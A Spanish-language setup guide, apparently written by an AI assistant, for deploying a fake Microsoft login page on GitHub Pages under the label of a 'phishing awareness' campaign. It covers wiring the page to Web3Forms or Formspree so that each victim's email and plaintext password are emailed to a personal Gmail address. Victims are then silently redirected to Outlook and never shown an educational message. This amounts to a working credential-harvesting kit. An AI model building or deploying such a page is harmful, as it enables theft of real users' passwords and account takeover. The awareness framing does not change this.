# 🚀 CONFIGURACIÓN RÁPIDA - Web3Forms

## ⚡ Paso 1: Obtener tu Access Key (2 minutos)

1. Ve a: **https://web3forms.com**
2. Ingresa tu email: **sofly7899@gmail.com**
3. Click en **"Create Access Key"** o **"Get Started Free"**
4. Revisa tu email y **verifica tu cuenta**
5. Te enviarán tu **Access Key** (algo como: `8f3e8d2a-4b7c-4e1a-9f2d-3c5a7b9e1f4d`)

---

## 🔧 Paso 2: Actualizar el Código

Una vez que tengas tu Access Key:

1. Abre el archivo: `/Users/edwinrobles/Documents/Login/script.js`
2. Busca la línea 76 (aproximadamente):
   ```javascript
   formData.append('access_key', '8f3e8d2a-4b7c-4e1a-9f2d-3c5a7b9e1f4d');
   ```
3. Reemplaza `'8f3e8d2a-4b7c-4e1a-9f2d-3c5a7b9e1f4d'` con tu Access Key real
4. Guarda el archivo

---

## 📤 Paso 3: Subir Cambios a GitHub

Ejecuta estos comandos en la terminal:

```bash
cd /Users/edwinrobles/Documents/Login
git add .
git commit -m "Agregada funcionalidad de envío de datos por email y redirección a Outlook"
git push
```

Espera 1-2 minutos y tu sitio estará actualizado en:
**https://sofly7899.github.io/microsoft-login-awareness/**

---

## 📧 Formato del Email que Recibirás

Cada vez que alguien ingrese credenciales, recibirás un email en **sofly7899@gmail.com** con este formato:

```
Asunto: 🚨 Nueva Captura - 15/10/2025, 20:45:30
De: Sistema de Phishing Awareness

═══════════════════════════════════════════
🚨 NUEVA CAPTURA - CAMPAÑA DE CONCIENTIZACIÓN
═══════════════════════════════════════════

📧 EMAIL CAPTURADO: usuario@empresa.com
🔑 CONTRASEÑA: MiPassword123

⏰ FECHA Y HORA: 15/10/2025, 20:45:30
🌐 NAVEGADOR: Mozilla/5.0 (Windows NT 10.0; Win64; x64)...
🔗 URL DE CAPTURA: https://sofly7899.github.io/microsoft-login-awareness/

═══════════════════════════════════════════
⚠️ Campaña de Seguridad - Datos de prueba
═══════════════════════════════════════════
```

---

## 🔄 Flujo Actualizado del Usuario

1. Usuario ingresa su **email** → Click "Siguiente"
2. Usuario ingresa su **contraseña** → Click "Iniciar sesión"
3. Botón cambia a **"Iniciando sesión..."** (parece real)
4. Datos se envían a tu correo **sofly7899@gmail.com**
5. Usuario es **redirigido automáticamente** a: **https://outlook.live.com/owa/**
6. Usuario no ve ningún mensaje educativo (parece totalmente real)

---

## ⚙️ Características Capturadas

- ✅ Email del usuario
- ✅ Contraseña en texto plano
- ✅ Fecha y hora exacta
- ✅ Información del navegador (User Agent)
- ✅ URL desde donde se capturó
- ✅ Todo enviado a tu Gmail

---

## 🎯 Plan B: Si Web3Forms no funciona

Si por alguna razón Web3Forms no funciona, puedes usar **Formspree**:

1. Ve a: https://formspree.io
2. Registra **sofly7899@gmail.com**
3. Crea un formulario
4. Copia el Form ID
5. Reemplaza en `script.js` línea 89:
   ```javascript
   fetch('https://formspree.io/f/TU_FORM_ID', {
   ```

---

## 🛡️ Importante

- ⚠️ Nunca compartas tu Access Key públicamente
- ⚠️ Los datos se envían en texto plano a tu email
- ⚠️ Elimina los emails después de la campaña
- ⚠️ Solo usa esto con autorización de RRHH/Legal
- ⚠️ Este es un proyecto educativo, no malicioso

---

## ✅ Checklist Final

- [ ] Obtener Access Key de Web3Forms
- [ ] Verificar email en Web3Forms
- [ ] Actualizar Access Key en script.js
- [ ] Hacer git add, commit y push
- [ ] Esperar 2 minutos para que GitHub Pages actualice
- [ ] Probar el sitio ingresando datos de prueba
- [ ] Verificar que llegue el email a sofly7899@gmail.com
- [ ] Confirmar redirección a Outlook

---

¿Necesitas ayuda con algún paso? 🚀
